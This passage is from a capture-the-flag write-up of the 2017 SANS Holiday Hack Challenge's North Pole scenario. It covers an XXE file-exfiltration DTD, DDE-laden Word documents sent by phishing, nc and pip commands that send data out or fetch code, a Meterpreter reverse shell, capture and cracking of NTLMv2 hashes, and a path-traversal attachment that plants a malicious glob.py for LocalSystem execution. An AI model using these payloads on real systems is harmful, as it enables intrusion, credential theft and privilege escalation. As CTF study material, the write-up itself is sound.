&lt;!<span style="color: #b5bd68;">ENTITY</span> % stolendata <span style="color: #b5bd68;">SYSTEM</span> <span style="color: #b294bb;">"</span><span style="color: #b294bb;">file:///c:/greatbook.txt</span><span style="color: #b294bb;">"</span>&gt;
&lt;!<span style="color: #b5bd68;">ENTITY</span> % inception <span style="color: #b294bb;">"</span><span style="color: #b294bb;">&lt;!ENTITY &amp;#x25; sendit SYSTEM 'http://10.142.0.11:8272/?%stolendata;'&gt;</span><span style="color: #b294bb;">"</span>&gt;
</pre>
</div>

<p>
We'll upload our file one more time, and&#x2026;
</p>

<pre class="example">
alabaster_snowball@hhc17-apache-struts2:/tmp/asnow.yNLdj0xcg7AZi5v1gYns2lFO$ nc -l -p 8272
GET /?http://eaas.northpolechristmastown.com/xMk7H1NypzAqYoKw/greatbook6.pdf HTTP/1.1
Host: 10.142.0.11:8272
Connection: Keep-Alive
</pre>

<p>
Success! In the <code>GET</code> request, the text after <code>?</code> is the contents of C:\greatbook.txt. If we pull up that URL, we get GreatBookPage6.pdf.
</p>
</div>
</div>

<div id="outline-container-org67a2033" class="outline-4">
<h4 id="q6_solution"><a id="org67a2033"></a>Solution</h4>
<div class="outline-text-4" id="text-q6_solution">
<p>
We upload this XML file:
</p>

<div class="org-src-container">
<pre class="src src-xml">&lt;?<span style="color: #b5bd68;">xml</span> <span style="color: #f0c674;">version</span>=<span style="color: #8abeb7;">"</span><span style="color: #8abeb7;">1.0</span><span style="color: #8abeb7;">"</span> <span style="color: #f0c674;">encoding</span>=<span style="color: #8abeb7;">"</span><span style="color: #8abeb7;">utf-8</span><span style="color: #8abeb7;">"</span>?&gt;
&lt;!<span style="color: #b5bd68;">DOCTYPE</span> demo [
    &lt;!<span style="color: #b5bd68;">ELEMENT</span> demo <span style="color: #b5bd68;">ANY</span> &gt;
    &lt;!<span style="color: #b5bd68;">ENTITY</span> % extentity <span style="color: #b5bd68;">SYSTEM</span> <span style="color: #b294bb;">"</span><span style="color: #b294bb;">http://10.142.0.11:8271/evil.dtd</span><span style="color: #b294bb;">"</span>&gt;
    %extentity;
    %inception;
    %sendit;
    ]
&gt;
</pre>
</div>

<p>
And this is our DTD:
</p>

<div class="org-src-container">
<pre class="src src-xml">&lt;?<span style="color: #b5bd68;">xml</span> <span style="color: #f0c674;">version</span>=<span style="color: #8abeb7;">"</span><span style="color: #8abeb7;">1.0</span><span style="color: #8abeb7;">"</span> <span style="color: #f0c674;">encoding</span>=<span style="color: #8abeb7;">"</span><span style="color: #8abeb7;">UTF-8</span><span style="color: #8abeb7;">"</span>?&gt;
&lt;!<span style="color: #b5bd68;">ENTITY</span> % stolendata <span style="color: #b5bd68;">SYSTEM</span> <span style="color: #b294bb;">"</span><span style="color: #b294bb;">file:///c:/greatbook.txt</span><span style="color: #b294bb;">"</span>&gt;
&lt;!<span style="color: #b5bd68;">ENTITY</span> % inception <span style="color: #b294bb;">"</span><span style="color: #b294bb;">&lt;!ENTITY &amp;#x25; sendit SYSTEM 'http://10.142.0.11:8272/?%stolendata;'&gt;</span><span style="color: #b294bb;">"</span>&gt;
</pre>
</div>

<p>
When we upload our XML file, we receive the contents of the target file, and can then download the PDF.
</p>
</div>
</div>

<div id="outline-container-org0218e28" class="outline-4">
<h4 id="q6_common-pitfalls"><a id="org0218e28"></a>Common Pitfalls</h4>
<div class="outline-text-4" id="text-q6_common-pitfalls">
<p>
This followed closely to the SANS blog post, but there was a typo and an HTML rendering issue with some of the provided code that caused some headaches.
</p>
</div>
</div>
</div>
<div id="outline-container-orgc8b92ea" class="outline-3">
<h3 id="orgc8b92ea">EMI: Going Deep</h3>
<div class="outline-text-3" id="text-orgc8b92ea">
</div>
<div id="outline-container-org167ef9e" class="outline-4">
<h4 id="q7_question"><a id="org167ef9e"></a>Question</h4>
<div class="outline-text-4" id="text-q7_question">
<p>
Like any other complex SCADA systems, the North Pole uses Elf-Machine
Interfaces (EMI) to monitor and control critical infrastructure
assets. These systems serve many uses, including email access and web
browsing. Gain access to the EMI server through the use of a phishing
attack with your access to the EWA server. Retrieve The Great Book
page from C:\GreatBookPage7.pdf. What does The Great Book page
describe?
</p>

<p>
<i>Shinny Upatree offers hints for this challenge inside the North Pole and Beyond.</i>
</p>
</div>
</div>

<div id="outline-container-orgf31ddb6" class="outline-4">
<h4 id="q7_background-information"><a id="orgf31ddb6"></a>Background Information</h4>
<div class="outline-text-4" id="text-q7_background-information">
<p>
Hints:
</p>

<ol class="org-ol">
<li>I'm still a little angry with Alabaster for reprimanding me for a security violation. He still checks his email from the EMI system!</li>
<li>He tells us not to install unnecessary software on systems, but he's running IIS with ASPX services on the EMI server, and Microsoft Office!</li>
<li>Personally, I don't use Microsoft Word. I'll take vim and LaTeX any day. Word does have its advantages though, including some of the Dynamic Data Exchange features for transferring data between applications and obtaining data from external data sources, including executables.</li>
</ol>

<p>
The question gives us a place to start. As we were reviewing the e-mails for Question 4, a few intriguing ones stood out:
</p>

<blockquote>
<p>
<b>From</b>: minty.candycane@northpolechristmastown.com
</p>

<p>
<b>To</b>: alabaster.snowball@northpolechristmastown.com
</p>

<p>
<b>Subject</b>: Should we be worried?
</p>



<p>
Hey Alabaster,
</p>

<p>
You know I'm a novice security enthusiast, well I saw an article a while 
ago about regarding DDE exploits that dont need macros for MS word to 
get command execution.
</p>

<p>
<a href="https://sensepost.com/blog/2017/macro-less-code-exec-in-msword/">https://sensepost.com/blog/2017/macro-less-code-exec-in-msword/</a>
</p>

<p>
Should we be worried about this?
</p>

<p>
I tried it on my local machine and was able to transfer a file. Here's a 
poc:
</p>


<div class="figure">
<p><img src="./images/dde_exmaple_minty_candycane_small.png" alt="dde_exmaple_minty_candycane_small.png" />
</p>
</div>

<p>
I know your the resident computer engineer here so I wanted to defer to 
the expert.
</p>

<p>
:)
</p>

<p>
-Minty CandyCane.
</p>
</blockquote>

<p>
This certainly seems to line up with the hints that we were given. Alabaster's not worried, however:
</p>

<blockquote>
<p>
<b>Subject</b>: Re: Should we be worried?
</p>


<p>
Quit worrying Minty,
</p>

<p>
You have nothing to worry about with me around! I have developed most of 
the applications in our network including our network defenses. We are 
are completely secure and impenetrable.
</p>

<p>
Sincerely,
</p>

<p>
Alabaster Snowball.
</p>
</blockquote>

<p>
The other e-mails that seemed intriguging were these two, also from Alabaster:
</p>

<blockquote>
<p>
<b>Subject</b>: gingerbread cookie recipe
</p>


<p>
Hey Mrs Claus,
</p>

<p>
Do you have that awesome gingerbread cookie recipe you made for me last year? You sent it in a MS word .docx file. I would totally open that 
docx on my computer if you had that. I would click on anything with the words gingerbread cookie recipe in it. I'm totally addicted and want to 
make some more.
</p>

<p>
Thanks,
</p>

<p>
Alabaster Snowball
</p>
</blockquote>

<blockquote>
<p>
<b>Subject</b>: Re: COOKIES!
</p>


<p>
Awesome, yea if anyone finds that .docx file containing the recipe for "gingerbread cookie recipe", please send it to me in a docx file. Im 
currently working on my computer and would totally download that to my machine, open it, and click to all the prompts.
</p>


<p>
Thanks!
</p>

<p>
Alabaster Snowball.
</p>
</blockquote>


<div class="figure">
<p><img src="./images/cookies.jpg" alt="cookies.jpg" />
</p>
<p><span class="figure-number">Figure 24: </span>Artist's Rendering of Alabaster Snowball</p>
</div>
</div>
</div>

<div id="outline-container-org1163b2a" class="outline-4">
<h4 id="q7_goal"><a id="org1163b2a"></a>Goal</h4>
<div class="outline-text-4" id="text-q7_goal">
<p>
We're trying to craft a malicious .docx file which we'll e-mail to
alabaster.snowball@northpolechristmastown.com via the EWA system. When
Alabaster opens the e-mail on the EMI system, the command that we
embed in the file should get us access to <code>C:\GreatBookPage7.pdf</code>.
</p>
</div>
</div>

<div id="outline-container-org8987b30" class="outline-4">
<h4 id="q7_approach"><a id="org8987b30"></a>Approach</h4>
<div class="outline-text-4" id="text-q7_approach">
<p>
At this point, we have a pretty good idea of what we need to do. The
sensepost blog post gives us some good instructions at how to
construct a malicious docx, and we know how to get Alabaster to click
on it.
</p>

<p>
However, there's a slightly easier way. On the SMB FileStor, we found
a docx that Shinny created for Wunorse. If we show the fields (Alt+F9
on Windows, Option+F9 on Mac), we see that this document has a DDE
field we can just modify.
</p>


<div class="figure">
<p><img src="./images/wunorse_docx.png" alt="wunorse_docx.png" />
</p>
</div>

<p>
Shinny told us that the EMI system also runs IIS, so let's just try copying the PDF into the default IIS webroot.
</p>

<p>
We'll open up <code>MEMO - Calculator Access for Wunorse.docx</code>, and edit the command to:
</p>

<pre class="example">
DDEAUTO c:\\windows\\system32\\cmd.exe "/k copy C:\\GreatBookPage7.pdf 
C:\\inetpub\\wwwroot\\4beadb1e-5ddb-4636-98a4-c2dac0f79ab3.pdf"
</pre>

<p>
Then, we use the EWA web interface to send an e-mail to Alabaster,
with the document attached. We make sure to include the words
"gingerbread," "cookie," and "recipe" in the message body, since he
told us that that's what he'll click on.
</p>

<p>
After we send the message, we wait a few minutes, and soon the file shows up!
</p>
</div>
</div>

<div id="outline-container-org1c30986" class="outline-4">
<h4 id="q7_solution"><a id="org1c30986"></a>Solution</h4>
<div class="outline-text-4" id="text-q7_solution">
<p>
We modified <code>MEMO - Calculator Access for Wunorse.docx</code> to copy the PDF into the IIS webroot, e-mailed that to Alabaster, then downloaded the copy of the file once it showed up.
</p>
</div>
</div>

<div id="outline-container-org72810f0" class="outline-4">
<h4 id="org72810f0">Going Deeper &#x2013; Command Execution</h4>
<div class="outline-text-4" id="text-org72810f0">
<p>
Getting the PDF is cool, but what else can we find on this system? Some of the other e-mails harp on Alabaster having installed <code>netcat</code>, and having it in his path. Let's run a command, and pipe the result to <code>netcat</code>, which will send it back to our system:
</p>

<pre class="example">
DDEAUTO c:\\windows\\system32\\cmd.exe "/k dir C:\\ | nc 1.2.3.4 8888"
</pre>

<p>
On our system, we start a <code>netcat</code> listener:
</p>

<pre class="example">
$ nc -l -p 8888
 Volume in drive C has no label.
 Volume Serial Number is 9454-C240

 Directory of C:\

12/04/2017  08:42 PM         1,053,508 GreatBookPage7.pdf
11/14/2017  07:57 PM    &lt;DIR&gt;          inetpub
09/12/2016  11:35 AM    &lt;DIR&gt;          Logs
12/05/2017  05:00 PM    &lt;DIR&gt;          Microsoft
07/16/2016  01:23 PM    &lt;DIR&gt;          PerfLogs
11/15/2017  02:35 PM    &lt;DIR&gt;          Program Files
11/14/2017  08:24 PM    &lt;DIR&gt;          Program Files (x86)
11/15/2017  03:03 PM    &lt;DIR&gt;          python
11/14/2017  08:39 PM    &lt;DIR&gt;          Users
11/30/2017  06:23 PM    &lt;DIR&gt;          Windows
	       1 File(s)      1,053,508 bytes
	       9 Dir(s)  33,072,455,680 bytes free

C:\Users\alabaster_snowball\Documents&gt;
</pre>

<p>
Success! At this point, we started working on a way to automate
this. However, more complex commands would often not work, due to
issues with escaping. So instead of using <code>cmd.exe</code> as our delivery
mechanism, we used Python.
</p>

<p>
Python is installed on the system, and a simple command that we can run is to install a Python module via pip:
</p>

<div class="org-src-container">
<pre class="src src-sh">python.exe -m pip install http://1.2.3.4/foo.tar.gz
</pre>
</div>

<p>
When pip installs a module, it will run the <code>setup.py</code> file. By adding
arbitrary Python code to this file, we can execute commands without
needing to worry about encoding them in a Word document, etc.
</p>

<p>
The end result was writing a complete end-to-end script, which will
build a malicious Word document, e-mail it, create a malicious Python
module, and use it to download the PDF.
</p>
</div>
</div>

<div id="outline-container-org9365081" class="outline-4">
<h4 id="org9365081">Level 2 &#x2013; Meterpreter Shell</h4>
<div class="outline-text-4" id="text-org9365081">
<div class="note">
<p>
Originally, the system had Windows Defender enabled, which would block some default Meterpreter payloads
</p>

</div>

<p>
Instead of just downloading the PDF file, we can modify our script to send a Python meterpreter payload.
</p>

<p>
We start Meterpreter listening on our local system:
</p>

<pre class="example">
$ msfconsole -r python-meterpreter-staged-reverse-tcp-4444-py.rc

 _                                                    _
/ \    /\         __                         _   __  /_/ __
| |\  / | _____   \ \           ___   _____ | | /  \ _   \ \
| | \/| | | ___\ |- -|   /\    / __\ | -__/ | || | || | |- -|
|_|   | | | _|__  | |_  / -\ __\ \   | |    | | \__/| |  | |_
      |/  |____/  \___\/ /\ \\___/   \/     \__|    |_\  \___\


       =[ metasploit v4.16.14-dev-140955f                 ]
+ -- --=[ 1698 exploits - 969 auxiliary - 299 post        ]
+ -- --=[ 500 payloads - 40 encoders - 10 nops            ]
+ -- --=[ Free Metasploit Pro trial: http://r-7.co/trymsp ]

[*] Processing msf_payloads/python-meterpreter-staged-reverse-tcp-4444-py.rc for ERB directives.
resource (msf_payloads/python-meterpreter-staged-reverse-tcp-4444-py.rc)&gt; use exploit/multi/handler
resource (msf_payloads/python-meterpreter-staged-reverse-tcp-4444-py.rc)&gt; set PAYLOAD python/meterpreter/reverse_tcp
PAYLOAD =&gt; python/meterpreter/reverse_tcp
resource (msf_payloads/python-meterpreter-staged-reverse-tcp-4444-py.rc)&gt; set LHOST 1.2.3.4
LHOST =&gt; 1.2.3.4
resource (msf_payloads/python-meterpreter-staged-reverse-tcp-4444-py.rc)&gt; set LPORT 4444
LPORT =&gt; 4444
resource (msf_payloads/python-meterpreter-staged-reverse-tcp-4444-py.rc)&gt; set ExitOnSession false
ExitOnSession =&gt; false
resource (msf_payloads/python-meterpreter-staged-reverse-tcp-4444-py.rc)&gt; run -j
[*] Exploit running as background job 0.
[*] Started reverse TCP handler on 1.2.3.4:4444
</pre>

<p>
Now we use our all-in-one script to send Alabaster our malicious file:
</p>

<pre class="example">
$ ./full_phish.py                                                                                                                                                                                                                                         master
Using 1.2.3.4 as external IP
Found word/document.xml, rewriting 50793 bytes
Before:
DEAUTO c:\\windows\\system32\\cmd.exe "/k calc.exe"
After:
DEAUTO c:\\windows\\system32\\cmd.exe "/k python.exe -m pip install http://1.2.3.4:8888/foo-1.0.tar.gz"
File uploaded and available at http://mail.northpolechristmastown.com/attachments/emusQH5oH5K2hzajPFvJbTGMuS__gingerbreadcookierecipe.docx
Sending message...

{'result': 'Message &lt;f67b9d00-b263-2fdf-f3d1-2d679bbca9f4@northpolechristmastown.com&gt; sent: 250 2.0.0 Ok: queued as 28EF1C356D', 'bool': True}
Using 1.2.3.4 as external IP
Listening on port 44665
Starting server on port 8888, use &lt;Ctrl-C&gt; to stop
Serving request 1 of 1...
/foo-1.0.tar.gz foo-1
35.185.57.190 - - [10/Jan/2018 03:14:47] "GET /foo-1.0.tar.gz HTTP/1.1" 200 -
</pre>

<p>
And sure enough, we see a new session in Meterpreter:
</p>

<pre class="example">
msf exploit(handler) &gt;
[*] Sending stage (42231 bytes) to 35.185.57.190
[*] Meterpreter session 1 opened (1.2.3.4:4444 -&gt; 35.185.57.190:52319) at 2018-01-10 03:15:51 +0000

msf exploit(handler) &gt; sessions -i 1
[*] Starting interaction with 1...

meterpreter &gt; sysinfo
Computer        : hhc17-smb-server
OS              : Windows 2016 (Build 14393)
Architecture    : x64
System Language : en_US
Meterpreter     : python/windows
</pre>
</div>
</div>

<div id="outline-container-org5fc1d1f" class="outline-4">
<h4 id="org5fc1d1f">Getting Alabaster's Password</h4>
<div class="outline-text-4" id="text-org5fc1d1f">
<p>
Being able to use Meterpreter is nice, but it sure would be cool if we
could Remote Desktop, or see if Alabaster's password is in use
elsewhere. We'll use Metasploit's SMB Authentication Capture module.
</p>

<div class="tip">
<p>
Try to avoid running Metasploit as root. In this case, we'll need to bind to a privileged port (445), but we can use <code>iptables</code> to redirect our traffic instead:
<code>sudo iptables -A PREROUTING -t nat -p tcp --dport 445 -j REDIRECT --to-port 3445</code>
</p>

</div>

<pre class="example">
msf exploit(handler) &gt; use auxiliary/server/capture/smb
msf auxiliary(smb) &gt; info

       Name: Authentication Capture: SMB
     Module: auxiliary/server/capture/smb
    License: Metasploit Framework License (BSD)
       Rank: Normal

Provided by:
  hdm &lt;x@hdm.io&gt;

Available actions:
  Name     Description
  ----     -----------
  Sniffer

Basic options:
  Name        Current Setting   Required  Description
  ----        ---------------   --------  -----------
  CAINPWFILE                    no        The local filename to store the hashes in Cain&amp;Abel format
  CHALLENGE   1122334455667788  yes       The 8 byte server challenge
  JOHNPWFILE                    no        The prefix to the local filename to store the hashes in John format
  SRVHOST     0.0.0.0           yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0
  SRVPORT     445              yes       The local port to listen on.

Description:
  This module provides a SMB service that can be used to capture the
  challenge-response password hashes of SMB client systems. Responses
  sent by this service have by default the configurable challenge
  string (\x11\x22\x33\x44\x55\x66\x77\x88), allowing for easy
  cracking using Cain &amp; Abel, L0phtcrack or John the ripper (with
  jumbo patch). To exploit this, the target system must try to
  authenticate to this module. One way to force an SMB authentication
  attempt is by embedding a UNC path (\\SERVER\SHARE) into a web page
  or email message. When the victim views the web page or email, their
  system will automatically connect to the server specified in the UNC
  share (the IP address of the system running this module) and attempt
  to authenticate. Another option is using
  auxiliary/spoof/{nbns,llmnr} to respond to queries for names the
  victim is already looking for.

msf auxiliary(smb) &gt; set SRVPORT 3445
SRVPORT =&gt; 3445
msf auxiliary(smb) &gt; set JOHNPWFILE alabaster_snowball.john
JOHNPWFILE =&gt; alabaster_snowball.john
msf auxiliary(smb) &gt; run
[*] Auxiliary module running as background job 3.
</pre>

<p>
Now, we'll send the following command via e-mail:
</p>

<pre class="example">
DDEAUTO c:\\windows\\system32\\cmd.exe "/k dir \\\\1.2.3.4\\a"
</pre>

<p>
And sure enough, we get the following hashes:
</p>

<pre class="example">
[*] SMB Captured - 2018-12-20 17:08:24 +0000
NTLMv2 Response Captured from 35.185.57.190:49759 - 35.185.57.190
USER:alabaster_snowball DOMAIN:HHC17-SMB-SERVE OS: LM:
LMHASH:Disabled
LM_CLIENT_CHALLENGE:Disabled
NTHASH:314d4bd798cac0c5fa2bb107ba248cc6
NT_CLIENT_CHALLENGE:0101000000000000d1b912a0358ad30143592f0cabfa891000000000020000000000000000000000
[*] SMB Captured - 2018-12-20 17:08:24 +0000
NTLMv2 Response Captured from 35.185.57.190:49759 - 35.185.57.190
USER:alabaster_snowball DOMAIN:HHC17-SMB-SERVE OS: LM:
LMHASH:Disabled
LM_CLIENT_CHALLENGE:Disabled
NTHASH:aaa7328ccd721a5e96bfb188eb4ecbdd
NT_CLIENT_CHALLENGE:010100000000000001431ca0358ad301c89b21fb5e4c160d00000000020000000000000000000000
[*] SMB Captured - 2018-12-20 17:08:24 +0000
NTLMv2 Response Captured from 35.185.57.190:49759 - 35.185.57.190
USER:alabaster_snowball DOMAIN:HHC17-SMB-SERVE OS: LM:
LMHASH:Disabled
LM_CLIENT_CHALLENGE:Disabled
NTHASH:71570491da3f413ce830788429820789
NT_CLIENT_CHALLENGE:010100000000000024042ba0358ad301a28a0bc07ea8214300000000020000000000000000000000
</pre>

<p>
We now have the following file:
</p>

<pre class="example">
alabaster_snowball::HHC17-SMB-SERVE:1122334455667788:3d0a58908a34215103b43a000b5807ab:0101000000000000f0a52fe4358ad3018486290b6477913300000000020000000000000000000000
alabaster_snowball::HHC17-SMB-SERVE:1122334455667788:5c63d79712f174de38ee30de2136b53e:0101000000000000e4e554e4358ad301fee549fa52c9b5ef00000000020000000000000000000000
alabaster_snowball::HHC17-SMB-SERVE:1122334455667788:de4559d983096a0a895484a61834283f:0101000000000000fb6a68e4358ad301645b79e4a5ed58c300000000020000000000000000000000
</pre>

<p>
We'll use <code>hashcat</code> to crack this:
</p>

<pre class="example">
hashcat64.bin -m 5600 -a 0 alabaster_snowball.john.netntlmv2 wordlist.txt -O -w 4
...
alabaster_snowball::HHC17-SMB-SERVE:1122334455667788:3d0a58908a3...:Carried_mass_it_reader1
alabaster_snowball::HHC17-SMB-SERVE:1122334455667788:5c63d79712f...:Carried_mass_it_reader1
alabaster_snowball::HHC17-SMB-SERVE:1122334455667788:de4559d9830...:Carried_mass_it_reader1
Session..........: hashcat
Status...........: Cracked
Hash.Type........: NetNTLMv2
...
</pre>

<p>
Armed with a password, we can remote desktop:
</p>


<div class="figure">
<p><img src="./images/alabaster_rdp.png" alt="alabaster_rdp.png" width="500px" />
</p>
<p><span class="figure-number">Figure 26: </span>Logging in to EMI as Alabaster via RDP</p>
</div>

<p>
Woot! We're hand-waving some of this for now, as there will be a
longer discussion about how we cracked passwords. TODO link to that
discussion.
</p>
</div>
</div>

<div id="outline-container-org21945fb" class="outline-4">
<h4 id="org21945fb">Next up &#x2013; Privilege Escalation!</h4>
<div class="outline-text-4" id="text-org21945fb">
<p>
Unfortunately, our commands only run as Alabaster, who is just a
regular user on the EMI system. We can do better than that.
</p>

<p>
Once we got command execution on this system, we started looking to
see what was running. It was obvious that Office was not installed,
and we started to question whether Alabaster even used this system, or
if it was all a big charade.
</p>

<p>
We found that the system was running a service, called
<code>WindowsGrabber</code> which would download new e-mails, try to parse out
their DDE payloads, and execute them. It did this via <code>C:\Program Files\WindowsGrabber\alabaster_snowball.py</code>. That file also had credentials for the EWA system:
</p>

<div class="org-src-container">
<pre class="src src-python"><span style="color: #f0c674;">srverAddress</span> = <span style="color: #8abeb7;">'10.142.0.5'</span>
<span style="color: #969896; font-style: italic;">#</span><span style="color: #969896; font-style: italic;">srverAddress = '35.185.115.185'</span>
<span style="color: #f0c674;">user</span> = <span style="color: #8abeb7;">'alabaster.snowball@northpolechristmastown.com'</span>
<span style="color: #f0c674;">passw</span> = <span style="color: #8abeb7;">'power instrument gasoline film'</span>
</pre>
</div>

<p>
(As an aside, this code snippet also confirmed our theory about the
systems moving from the public IPs we found during the Recon stage, to
private ones).
</p>

<p>
This service was running as the alabaster_snowball user that we could
already run commands as, so it wasn't a target for privilege
elevation.
</p>

<p>
&#x2026;and then, on December 23rd, all of that changed. The setup was
changed, so now two services were running: <code>WindowsGrabber</code> was now
running as <code>LocalSystem</code>, a very privileged account on Windows, and
<code>agrabber</code> was running as Alabaster. The Python script was no longer
readable by Alabaster, but it was modified so that instead of directly
running the commands, it would write them to a file, and then the
lesser-privileged <code>agrabber</code> service would run them from that file.
</p>

<p>
Unfortunately, there was a vulnerability in
<code>alabaster_snowball.py</code>. It turns out that there are two ways to send
the file to Alabaster: we can either attach it via the EWA webmail
interface, which uploads a copy to <code>mail.northpolechristmastown.com</code>
and inserts a link in the e-mail, <b>OR</b> we can simply attach it to the
e-mail. In the case of the latter, the script does the following:
</p>

<div class="org-src-container">
<pre class="src src-python"><span style="color: #b5bd68;">def</span> <span style="color: #de935f;">save_attachment</span>(<span style="color: #b5bd68;">self</span>, msg):
    <span style="color: #8abeb7;">"""</span>
<span style="color: #8abeb7;">    Given a message, save its attachments to the specified</span>
<span style="color: #8abeb7;">    download folder (default is /tmp)</span>

<span style="color: #8abeb7;">    return: file path to attachment</span>
<span style="color: #8abeb7;">    """</span>
    <span style="color: #f0c674;">download_folder</span> = tempfile.mkdtemp()
    <span style="color: #f0c674;">att_path</span> = <span style="color: #81a2be;">False</span>
    <span style="color: #b5bd68;">for</span> part <span style="color: #b5bd68;">in</span> msg.walk():
        <span style="color: #b5bd68;">if</span> part.get_content_maintype() == <span style="color: #8abeb7;">'multipart'</span>:
            <span style="color: #b5bd68;">continue</span>
        <span style="color: #b5bd68;">if</span> part.get(<span style="color: #8abeb7;">'Content-Disposition'</span>) <span style="color: #b5bd68;">is</span> <span style="color: #81a2be;">None</span>:
            <span style="color: #b5bd68;">continue</span>

        <span style="color: #f0c674;">filename</span> = part.get_filename()
        <span style="color: #f0c674;">att_path</span> = os.path.join(download_folder, filename)

        <span style="color: #b5bd68;">if</span> <span style="color: #b5bd68;">not</span> os.path.isfile(att_path):
            <span style="color: #f0c674;">fp</span> = <span style="color: #b294bb;">open</span>(att_path, <span style="color: #8abeb7;">'wb'</span>)
            fp.write(part.get_payload(decode=<span style="color: #81a2be;">True</span>))
            fp.close()
    <span style="color: #b5bd68;">return</span> att_path
</pre>
</div>

<p>
The issue here is the line:
</p>

<div class="org-src-container">
<pre class="src src-python"><span style="color: #f0c674;">att_path</span> = os.path.join(download_folder, filename)
</pre>
</div>

<p>
The filename is controlled by us, as it comes from the e-mail message
itself. By prefixing our filename with <code>../../../..</code> we can write
anywhere on the system, as the LocalSystem account.
</p>

<p>
With unrestricted write access, how can we turn that into code
execution? We could a number of techniques, such as DLL hijacking, but
many are made more difficult by the fact that we can't <b>read</b> files
with our privileged access, only write to them.
</p>

<p>
Once again, we turned to Python. We targetted the
<code>alabaster_snowball.py</code> script itself, with Python module
injection. An import command such as:
</p>

<div class="org-src-container">
<pre class="src src-python"><span style="color: #b5bd68;">import</span> glob
</pre>
</div>

<p>
will cause Python to search for <code>glob.py</code> in the current directory,
and then in some system-wide directories. If we can write a malicious
<code>C:\Program Files\WindowsGrabber\glob.py</code>, the next time the service restarts, our code will run as LocalSystem.
</p>

<div class="danger">
<p>
These files can break the <code>alabaster_snowball.py</code> script. Because they're being written as privileged, the regular Alabaster account cannot modify or delete them. Take great care in what you send!
</p>

</div>

<p>
Our file ends up looking like this:
</p>

<div class="org-src-container">
<pre class="src src-python"><span style="color: #b5bd68;">import</span> sys, imp, os
<span style="color: #b5bd68;">def</span> <span style="color: #de935f;">get_mod</span>(modname):
    <span style="color: #f0c674;">fd</span>, <span style="color: #f0c674;">path</span>, <span style="color: #f0c674;">desc</span> = imp.find_module(modname, sys.path[::-1])
    <span style="color: #b5bd68;">return</span> imp.load_module(<span style="color: #8abeb7;">"orig_"</span> + modname, fd, path, desc)

<span style="color: #b294bb;">locals</span>().update(<span style="color: #b294bb;">vars</span>(get_mod(<span style="color: #b294bb;">__name__</span>)))

<span style="color: #b5bd68;">try</span>:
    <span style="color: #b5bd68;">if</span> <span style="color: #b5bd68;">not</span> os.path.isfile(<span style="color: #8abeb7;">"C:/Windows/Temp/have_run"</span>):
        os.system(<span style="color: #8abeb7;">'nssm install zGrabber C:\\Users\\ALABAS~1\\AppData\\Local\\Temp\\2\\4445.exe'</span>)
        <span style="color: #b294bb;">open</span>(<span style="color: #8abeb7;">"C:/Windows/Temp/have_run"</span>, <span style="color: #8abeb7;">'a'</span>).close()
    os.system(<span style="color: #8abeb7;">'nssm start zGrabber'</span>)
<span style="color: #b5bd68;">except</span>:
    <span style="color: #b5bd68;">print</span>(<span style="color: #8abeb7;">"Could not run"</span>)
</pre>
</div>

<p>
The top half loads the actual glob module, and makes it available to
anything that imported our malicious glob module. The bottom half
creates a new service, which will run a file that we uploaded,
4445.exe. This service uses the Non-Sucking Service Manager (nssm)
that manages the other Grabber services, and will be installed as a
LocalSystem service as well. Finally, we start our service, and ignore
any exceptions in case we made a mistake.
</p>

<p>
Getting this file right was a little nerve-wracking, and required a
great deal of testing. The vulnerability we found will only allow you
to write new files, and because the files are written as the
LocalSystem account, there was no way to modify or delete them once
written if this did not work.
</p>

<p>
Now, we craft an e-mail, which has our base64-encoded glob.py as an
attachment, and we give the attachment a filename that will put it in
the right place:
</p>

<pre class="example">
HELO l2s
MAIL FROM:&lt;wunorse.openslae@northpolechristmastown.com&gt;
RCPT TO:&lt;alabaster.snowball@northpolechristmastown.com&gt;
DATA
MIME-Version: 1.0
Subject: Test E-mail
From: wunorse.openslae@northpolechristmastown.com
To: alabaster.snowball@northpolechristmastown.com
Content-Type: multipart/mixed; boundary="089e082f74245acc5b05624d7433"

--089e082f74245acc5b05624d7433
Content-Type: multipart/alternative; boundary="089e082f74245acc5605624d7431"

--089e082f74245acc5605624d7431
Content-Type: text/plain; charset="UTF-8"

gingerbread cookie recipe


--089e082f74245acc5b05624d7433
Content-Type: text/x-python-script; charset="US-ASCII"; name="glob.py"
Content-Disposition: attachment; filename="../../../../../../../../../../../../Program Files/WindowsGrabber/glob.py"
Content-Transfer-Encoding: base64
X-Attachment-Id: f_jc6xkfum1

aW1wb3J0IHN5cywgaW1wLCBvcwpkZWYgZ2V0X21vZChtb2RuYW1lKToKICAgIGZkLCBwYXRoLCBk
ZXNjID0gaW1wLmZpbmRfbW9kdWxlKG1vZG5hbWUsIHN5cy5wYXRoWzo6LTFdKQogICAgcmV0dXJu
IGltcC5sb2FkX21vZHVsZSgib3JpZ18iICsgbW9kbmFtZSwgZmQsIHBhdGgsIGRlc2MpCgpsb2Nh
bHMoKS51cGRhdGUodmFycyhnZXRfbW9kKF9fbmFtZV9fKSkpCgp0cnk6CiAgICBpZiBub3Qgb3Mu
cGF0aC5pc2ZpbGUoIkM6L1dpbmRvd3MvVGVtcC9oYXZlX3J1biIpOgogICAgICAgIG9zLnN5c3Rl
bSgnbnNzbSBpbnN0YWxsIHpHcmFiYmVyIEM6XFxVc2Vyc1xcQUxBQkFTfjFcXEFwcERhdGFcXExv
Y2FsXFxUZW1wXFwyXFw0NDQ1LmV4ZScpCiAgICAgICAgb3BlbigiQzovV2luZG93cy9UZW1wL2hh
dmVfcnVuIiwgJ2EnKS5jbG9zZSgpCiAgICBvcy5zeXN0ZW0oJ25zc20gc3RhcnQgekdyYWJiZXIn
KQpleGNlcHQ6CiAgICBwcmludCgiQ291bGQgbm90IHJ1biIpCg==

--089e082f74245acc5b05624d7433--
.

</pre>

<p>
Now we just send that over <code>netcat</code>, and wait:
</p>

<pre class="example">
$ nc mail.northpolechristmastown.com 25
220 mail.northpolechristmastown.com ESMTP Postfix
HELO l2s
250 mail.northpolechristmastown.com
MAIL FROM:&lt;wunorse.openslae@northpolechristmastown.com&gt;
250 2.1.0 Ok
RCPT TO:&lt;alabaster.snowball@northpolechristmastown.com&gt;
550 5.7.1 &lt;alabaster.snowball@northpolechristmastown.com&gt;: Recipient address rejected: Message rejected due to: SPF fail - not authorized. 
Please see http://www.openspf.net/Why?s=mfrom;id=wunorse.openslae@northpolechristmastown.com;ip=10.142.0.3;r=alabaster.snowball@northpolechristmastown.com
</pre>

<p>
Foiled! If we dig a little deeper however, and we use our <code>nmap</code> scan results, we'll find that there's another SMTP service listening on port 2525 which <b>will</b> allow us to send our e-mail:
</p>

